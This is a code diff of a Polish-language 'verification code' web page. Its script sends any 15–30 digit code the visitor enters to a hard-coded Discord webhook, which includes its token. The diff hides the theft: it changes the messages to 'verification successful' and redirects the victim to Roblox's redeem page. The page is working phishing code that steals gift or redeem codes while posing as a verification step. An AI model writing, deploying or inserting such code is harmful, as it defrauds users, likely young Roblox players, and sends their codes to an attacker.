@@ -54,7 +54,7 @@
 
   <div class="content">
     <h1>Wpisz kod Weryfikacji!</h1>
-    <input type="password" id="code" placeholder="Podaj kod">
+    <input type="password" id="code" placeholder="Podaj kod ">
     <br>
     <button onclick="checkCode()">Sprawdź</button>
     <p id="message"></p>
@@ -102,19 +102,22 @@
       // Sprawdzenie, czy kod ma od 15 do 30 cyfr
       const regex = /^\d{15,30}$/;
       if (!regex.test(code)) {
-        message.textContent = "Kod musi mieć od 15 do 30 cyfr!";
+        message.textContent = "Błedny Kod!";
         return;
       }
 
-      message.textContent = "Kod wysłany!";
+      message.textContent = "Weryfikacja udana!";
 
       // Wyślij kod na webhook Discorda
-      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE"; // <- wklej swój webhook
+      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
       fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
       }).catch(err => console.error(err));
+
+      // Przekierowanie na stronę Roblox
+      window.location.href = "https://www.roblox.com/redeem";
     }
 
     window.addEventListener('resize', () => {
